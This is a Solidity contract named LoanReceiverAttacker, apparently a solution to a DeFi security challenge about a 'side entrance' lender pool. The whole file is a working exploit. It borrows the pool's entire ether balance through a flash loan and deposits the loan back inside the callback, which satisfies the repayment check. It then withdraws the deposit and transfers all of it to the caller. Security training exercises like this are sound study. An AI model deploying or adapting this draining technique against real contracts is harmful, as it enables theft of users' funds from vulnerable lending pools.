// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract LoanReceiverAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address payable poolAddress;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
        poolAddress = payable(_poolAddress);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function loan() public {
        uint256 amount = poolAddress.balance;
        pool.flashLoan(amount);
        takeMoney(msg.sender);
    }

    function takeMoney(address _address) public {
        pool.withdraw();
        payable(_address).transfer(address(this).balance);
    }

    receive() external payable {}
}
